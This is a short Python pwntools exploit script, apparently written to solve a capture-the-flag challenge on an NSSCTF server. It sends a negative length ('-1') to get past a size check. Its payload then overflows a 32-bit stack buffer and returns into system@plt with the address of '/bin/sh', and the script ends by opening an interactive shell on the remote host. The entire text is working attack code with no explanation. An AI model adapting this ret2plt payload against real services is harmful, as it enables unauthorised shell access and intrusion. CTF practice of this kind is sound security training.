from pwn import *

context.gdb_binary = "/bin/pwndbg"
#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 20100)
elf = ELF("./pwn")

io.recvuntil(b"choice:")
io.sendline(b"1")
io.recvuntil(b"name:")
io.sendline(b"-1")
io.recvuntil(b"name?\n")

binsh = 0x804A008
system_plt = elf.plt["system"]


payload = b"a" * (0x20 + 0x4) + p32(system_plt) + p32(0) + p32(binsh)

# gdb.attach(io)
io.sendline(payload)

io.interactive()
